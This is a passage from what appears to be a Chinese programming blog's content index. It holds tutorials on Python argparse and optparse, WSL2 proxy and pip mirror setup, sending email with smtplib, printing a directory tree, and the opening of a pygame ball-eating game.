string">'--debug'</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">'store_true'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Print debug information'</span><span class="token punctuation">)</span>options<span class="token punctuation">,</span> args<span class="token operator">=</span>parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>action有三种类型：</p><ul><li>action=’store’ 默认类型，可以忽略不写。用户必须给出一个明确的参数值，该类型定义了将实际参数值保存到dest指定变量中</li><li>action=’store_true’ 用户不需给出参数值，该类型定义了将布尔值true保存到dest指定的变量中(和上面getopt中不加 ‘:’ 、’=’)</li><li>action=’store_false’ 用户不需给出参数值，该类型定义了将布尔值false保存到dest指定的变量中</li></ul><h4 id="获取软件版本"><a href="#获取软件版本" class="headerlink" title="获取软件版本"></a>获取软件版本</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">parser <span class="token operator">=</span> OptionParser<span class="token punctuation">(</span>usage<span class="token operator">=</span><span class="token string">"%prog [-f] [-q]"</span><span class="token punctuation">,</span> version<span class="token operator">=</span><span class="token string">"%prog 1.0"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出version</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python xxx.py --version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">parser<span class="token punctuation">.</span>print_version<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 打印版本</span><span class="token keyword">print</span><span class="token punctuation">(</span>parser<span class="token punctuation">.</span>get_version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 返回版本</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="argparse模块"><a href="#argparse模块" class="headerlink" title="argparse模块"></a>argparse模块</h3><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><ol><li>新建解释器 argparse.ArgumentParser()</li><li>添加命令 add_argument()</li><li>添加子命令 </li></ol><h4 id="添加参数"><a href="#添加参数" class="headerlink" title="添加参数"></a>添加参数</h4><p>分为添加位置参数-positional arguments和可选参数-optional arguments</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 创建解析器</span>parse <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 位置参数，没有前缀</span>parse<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">)</span><span class="token comment"># 可选参数，带有前缀，带’-‘为短参数，带’--‘为长参数</span><span class="token comment"># 可以包含其中一个，也可以两个都包含</span>parse<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-r'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"运行"</span><span class="token punctuation">)</span>parse<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-i'</span><span class="token punctuation">,</span> <span class="token string">'--init'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'初始化'</span><span class="token punctuation">)</span>parse<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--show'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'打印信息'</span><span class="token punctuation">)</span>args <span class="token operator">=</span> parse<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'boo'</span><span class="token punctuation">,</span> <span class="token string">'-r'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'-i'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'--show'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>parse<span class="token punctuation">.</span>print_help<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 打印帮助信息，和传入-h参数效果一些</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 打印对象参数</span><span class="token keyword">print</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span>  <span class="token comment"># 打印对象</span><span class="token keyword">print</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>foo<span class="token punctuation">)</span>  <span class="token comment"># 打印变量值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="短参数和长参数"><a href="#短参数和长参数" class="headerlink" title="短参数和长参数"></a>短参数和长参数</h4><h4 id="位置变量"><a href="#位置变量" class="headerlink" title="位置变量"></a>位置变量</h4><h4 id="可选变量"><a href="#可选变量" class="headerlink" title="可选变量"></a>可选变量</h4><p>实例</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">parse <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'帮助描述信息'</span><span class="token punctuation">,</span> prog<span class="token operator">=</span><span class="token string">'%prog'</span><span class="token punctuation">,</span> epilog<span class="token operator">=</span><span class="token string">'底部显示信息'</span><span class="token punctuation">)</span>parse<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-u'</span><span class="token punctuation">,</span> <span class="token string">'--user'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'user name'</span><span class="token punctuation">)</span>parse<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span> <span class="token string">'--password'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'password'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'user password'</span><span class="token punctuation">)</span>parse<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-s'</span><span class="token punctuation">,</span> <span class="token string">'--sex'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'sex'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> choices<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'男'</span><span class="token punctuation">,</span> <span class="token string">'女'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'男'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'target sex'</span><span class="token punctuation">)</span>group <span class="token operator">=</span>parse<span class="token punctuation">.</span>add_argument_group<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">'foo'</span><span class="token punctuation">)</span>group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-n'</span><span class="token punctuation">,</span> <span class="token string">'--number'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'Num'</span><span class="token punctuation">,</span> nargs<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'target Two Numbers'</span><span class="token punctuation">)</span>parse<span class="token punctuation">.</span>add_argument_group<span class="token punctuation">(</span>group<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>parse<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">usage: %prog [-h] [-u USER] [-p PASSWORD] [-s {男,女}] -n NUM NUM帮助描述信息optional arguments:  -h, --help            show this help message and exit  -u USER, --user USER  user name  -p PASSWORD, --password PASSWORD                        user password  -s {男,女}, --sex {男,女}                        target sexfoo:  -n NUM NUM, --number NUM NUM                        target Two Numbers底部显示信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://www.360doc.com/content/18/0929/15/50979635_790696415.shtml">http://www.360doc.com/content/18/0929/15/50979635_790696415.shtml</a></li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html">https://docs.python.org/zh-cn/3/library/argparse.html</a></li><li><a href="https://blog.csdn.net/caidaoqq/article/details/44706005">https://blog.csdn.net/caidaoqq/article/details/44706005</a></li><li><a href="https://www.cnblogs.com/songguoyou/p/11919730.html">https://www.cnblogs.com/songguoyou/p/11919730.html</a></li><li><a href="https://www.cnblogs.com/yuandonghua/p/10619941.html">https://www.cnblogs.com/yuandonghua/p/10619941.html</a></li><li><a href="https://www.runoob.com/python/python-command-line-arguments.html">https://www.runoob.com/python/python-command-line-arguments.html</a></li><li><a href="https://www.cnblogs.com/cuhm/p/10643765.html#/c/subject/p/10643765.html">https://www.cnblogs.com/cuhm/p/10643765.html#/c/subject/p/10643765.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 命令行参数 </tag>
            
            <tag> sys.argv </tag>
            
            <tag> getopt </tag>
            
            <tag> optparse </tag>
            
            <tag> argparse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wsl2配置</title>
      <link href="//blogs/wsl2-pei-zhi/"/>
      <url>//blogs/wsl2-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h2><p>配置代理之前需要获取网关ip，也就是物理机的ip，这个ip会动态变化，但是这个ip存在<code>/etc/resolv.conf</code>这个文件里。借鉴网上的一条命令</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">host_ip=$(cat /etc/resolv.conf |grep "nameserver" |cut -f 2 -d " ")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将这条命令写在<code>/etc/profile</code>或者<code>~/.bashrc</code>中可以在每次启动时执行，立即执行可以使用<code>source</code>命令</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cd ~source .bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="全局代理"><a href="#全局代理" class="headerlink" title="全局代理"></a>全局代理</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># 设置代理# 写入/etc/profilealias proxy='"export "http_proxy=http://$host_ip:10809/";export "https_proxy=http://$host_ip:10809/"' # 设置代理alias noproxy="unset http_proxy;unset https_proxy" # 取消代理# http代理export "http_proxy=http://$host_ip:10809/"export "https_proxy=http://$host_ip:10809/"#socks代理export "http_proxy=socks5://$host_ip:10808/"export "https_proxy=socks5://$host_ip:10808/"# 取消代理unset http_proxyunset https_proxyunset ftp_proxyunset no_proxy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="git代理"><a href="#git代理" class="headerlink" title="git代理"></a>git代理</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># 设置代理git config --global http.proxy http://$host_ip:10809git config --global https.proxy http://$host_ip:10809# 取消代理git config --global --unset http.proxygit config --global --unset https.proxy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="pip换源"><a href="#pip换源" class="headerlink" title="pip换源"></a>pip换源</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># 临时使用pip install -i https://mirrors.ustc.edu.cn/pypi/web/simple package# 设为默认pip config set global.index-url https://mirrors.ustc.edu.cn/pypi/web/simple<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> blogs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wsl2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python发送邮件</title>
      <link href="//code/python/python-fa-song-you-jian/"/>
      <url>//code/python/python-fa-song-you-jian/</url>
      
        <content type="html"><![CDATA[<p>SMTP是发送邮件的协议，Python内置对SMTP的支持，可以发送纯文本邮件、HTML邮件以及带附件的邮件。</p><p>Python对SMTP支持有<code>smtplib</code>和<code>email</code>两个模块，<code>email</code>负责构造邮件，<code>smtplib</code>负责发送邮件。</p><h3 id="发送纯文本文件"><a href="#发送纯文本文件" class="headerlink" title="发送纯文本文件"></a>发送纯文本文件</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> smtplib<span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>text <span class="token keyword">import</span> MIMETextmail_user<span class="token punctuation">,</span> mail_pass <span class="token operator">=</span> <span class="token string">"xxxxxx@qq.com"</span><span class="token punctuation">,</span> <span class="token string">'xxxxxxxxxxxx'</span>receivers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'xxx@xxxx.com'</span><span class="token punctuation">,</span> <span class="token string">'xxxx@xxxx.com'</span><span class="token punctuation">]</span><span class="token comment"># 构造MIMEText对象时，第一个参数就是邮件正文，第二个参数是MIME的subtype，传入'plain'表示纯文本，最终的MIME就是'text/plain'，最后一定要用utf-8编码保证多语言兼容性。</span>message <span class="token operator">=</span> MIMEText<span class="token punctuation">(</span><span class="token string">"邮件内容"</span><span class="token punctuation">,</span> <span class="token string">'plain'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    smtp <span class="token operator">=</span> smtplib<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 创建一个SMTP实例</span>    smtp<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">'smtp.qq.com'</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span>  <span class="token comment"># 连接到stmp服务器，默认端口为25</span>    smtp<span class="token punctuation">.</span>login<span class="token punctuation">(</span>mail_user<span class="token punctuation">,</span> mail_pass<span class="token punctuation">)</span>  <span class="token comment"># 设置登录用户名和用户密码</span>    smtp<span class="token punctuation">.</span>sendmail<span class="token punctuation">(</span>mail_user<span class="token punctuation">,</span> receivers<span class="token punctuation">,</span> message<span class="token punctuation">.</span>as_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 发送邮件，receivers是一个列表，可以同时给对多个邮箱发送邮件</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"邮件发送成功"</span><span class="token punctuation">)</span><span class="token keyword">except</span> smtplib<span class="token punctuation">.</span>SMTPException<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"邮件发送失败"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="发送HTML"><a href="#发送HTML" class="headerlink" title="发送HTML"></a>发送HTML</h3><p>无论是纯文本内容还是html或者二进制内容，都是通过email这个库来实现的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">msg <span class="token operator">=</span> MIMEText<span class="token punctuation">(</span><span class="token string">'&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hello&lt;/h1&gt;'</span> <span class="token operator">+</span>    <span class="token string">'&lt;p&gt;send by &lt;a href="http://www.python.org"&gt;Python&lt;/a&gt;...&lt;/p&gt;'</span> <span class="token operator">+</span>    <span class="token string">'&lt;/body&gt;&lt;/html&gt;'</span><span class="token punctuation">,</span> <span class="token string">'html'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token comment"># 设置第二个参数为html</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="发送附件"><a href="#发送附件" class="headerlink" title="发送附件"></a>发送附件</h3><p>1、实例化一个MIMEMultipart对象</p><p>2、attach一个MIMEText对象作为邮件正文</p><p>3、attach MIMEBase对象作为附件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">msg <span class="token operator">=</span> MIMEMultipart<span class="token punctuation">(</span><span class="token punctuation">)</span>    msg<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>MIMEText<span class="token punctuation">(</span><span class="token string">"附件"</span><span class="token punctuation">,</span> <span class="token string">'plain'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'emailDemo.py'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>        <span class="token comment"># # 设置附件的MIME和文件名</span>        attach <span class="token operator">=</span> MIMEBase<span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">,</span> <span class="token string">'plain'</span><span class="token punctuation">,</span> filename<span class="token operator">=</span><span class="token string">'emailDemo.py'</span><span class="token punctuation">)</span>        <span class="token comment"># 读入文件</span>        attach<span class="token punctuation">.</span>set_payload<span class="token punctuation">(</span>fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># 加上必要的头信息:</span>        attach<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">,</span> <span class="token string">'attachment'</span><span class="token punctuation">,</span> filename<span class="token operator">=</span><span class="token string">'emailDemo.py'</span><span class="token punctuation">)</span>        attach<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">'Content-ID'</span><span class="token punctuation">,</span> <span class="token string">'&lt;0&gt;'</span><span class="token punctuation">)</span>        attach<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">'X-Attachment-Id'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>        <span class="token comment"># # 用Base64编码</span>        encoders<span class="token punctuation">.</span>encode_base64<span class="token punctuation">(</span>attach<span class="token punctuation">)</span>        msg<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>attach<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python获取目录结构</title>
      <link href="//code/python/python-huo-qu-mu-lu-jie-gou/"/>
      <url>//code/python/python-huo-qu-mu-lu-jie-gou/</url>
      
        <content type="html"><![CDATA[<p>利用python获取目录结构</p><!----><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># @Time       : 2020/12/20 13:51</span><span class="token comment"># @Author     : ENDZHT</span><span class="token comment"># @ProjectName: pythonExercise</span><span class="token comment"># @FileName   : 获取目录文件.py</span><span class="token comment"># @Software   : PyCharm</span><span class="token keyword">import</span> os<span class="token keyword">import</span> os<span class="token punctuation">.</span>path<span class="token keyword">def</span> <span class="token function">dirfileshow</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token operator">=</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> depth<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    打印目录结构    1. 获取当前目录物理路径    2. 获取当前目录文件目录到列表，os.listdir()    3. 输出当前目录    4. 遍历列表，判断目标是文件还是目录    5. 如果是文件则直接输出，否则到1    :return:    """</span>    rootdir <span class="token operator">=</span> <span class="token builtin">dir</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    realdir <span class="token operator">=</span> <span class="token builtin">dir</span>  <span class="token comment"># 获取物理路径</span>    <span class="token keyword">if</span> depth <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"| "</span> <span class="token operator">+</span> realdir<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"| "</span> <span class="token operator">+</span> <span class="token string">"  "</span> <span class="token operator">*</span> depth <span class="token operator">+</span> <span class="token string">"+-- "</span> <span class="token operator">+</span> rootdir<span class="token punctuation">)</span>    <span class="token comment"># TODO:获取当前目录结构</span>    dirs <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>realdir<span class="token punctuation">)</span>    <span class="token comment"># TODO:判断文件目录</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> dirs<span class="token punctuation">:</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>realdir<span class="token punctuation">}</span></span><span class="token string">\\</span><span class="token interpolation"><span class="token punctuation">{</span>item<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"| "</span> <span class="token operator">+</span> <span class="token string">"  "</span> <span class="token operator">*</span> <span class="token punctuation">(</span>depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"--- "</span> <span class="token operator">+</span> item<span class="token punctuation">)</span>        <span class="token keyword">elif</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>realdir<span class="token punctuation">}</span></span><span class="token string">\\</span><span class="token interpolation"><span class="token punctuation">{</span>item<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>            dirfileshow<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>realdir<span class="token punctuation">}</span></span><span class="token string">\\</span><span class="token interpolation"><span class="token punctuation">{</span>item<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Todo: Add your code here</span>    <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment"># main()</span>    dirfileshow<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python小游戏—小球吃大球</title>
      <link href="//code/python/python-xiao-you-xi-xiao-qiu-chi-da-qiu/"/>
      <url>//code/python/python-xiao-you-xi-xiao-qiu-chi-da-qiu/</url>
      
        <content type="html"><![CDATA[<h3 id="大球吃小球"><a href="#大球吃小球" class="headerlink" title="大球吃小球"></a>大球吃小球</h3><p>完整代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># @Time       : 2020/12/16 15:52</span><span class="token comment"># @Author     : ENDZHT</span><span class="token comment"># @ProjectName: pythonExercise</span><span class="token comment"># @FileName   : 大球吃小球.py</span><span class="token comment"># @Software   : PyCharm</span><span class="token keyword">from</span> enum <span class="token keyword">import</span> Enum<span class="token punctuation">,</span> unique<span class="token keyword">from</span> math <span class="token keyword">import</span> sqrt<span class="token keyword">from</span> random <span class="token keyword">import</span> randint<span class="token keyword">import</span> pygame<span class="token decorator annotation punctuation">@unique</span><span class="token keyword">class</span> <span class="token class-name">Color</span><span class="token punctuation">(</span>Enum<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""颜色"""</span>    RED <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    GREEN <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    BLUE <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>    BLACK <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    WHITE <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>    GRAY <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">242</span><span class="token punctuation">,</span> <span class="token number">242</span><span class="token punctuation">,</span> <span class="token number">242</span><span class="token punctuation">)</span>    <span class="token decorator annotation punctuation">@staticmethod</span>    <span class="token keyword">def</span> <span class="token function">random_color</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""获得随机颜色"""</span>        r <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>        g <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>        b <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> r<span class="token punctuation">,</span> g<span class="token punctuation">,</span> b<span class="token keyword">class</span> <span class="token class-name">Ball</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""球"""</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> radius<span class="token punctuation">,</span> sx<span class="token punctuation">,</span> sy<span class="token punctuation">,</span> color<span class="token operator">=</span>Color<span class="token punctuation">.</span>RED<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""初始化方法"""</span>        self<span class="token punctuation">.</span>x <span class="token operator">=</span> x        self<span class="token punctuation">.</span>y <span class="token operator">=</span> y        self<span class="token punctuation">.</span>radius <span class="token operator">=</span> radius        self<span class="token punctuation">.</span>sx <span class="token operator">=</span> sx        self<span class="token punctuation">.</span>sy <span class="token operator">=</span> sy        self<span class="token punctuation">.</span>color <span class="token operator">=</span> color        self<span class="token punctuation">.</span>alive <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> screen<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""移动"""</span>        self<span class="token punctuation">.</span>x <span class="token operator">+=</span> self<span class="token punctuation">.</span>sx        self<span class="token 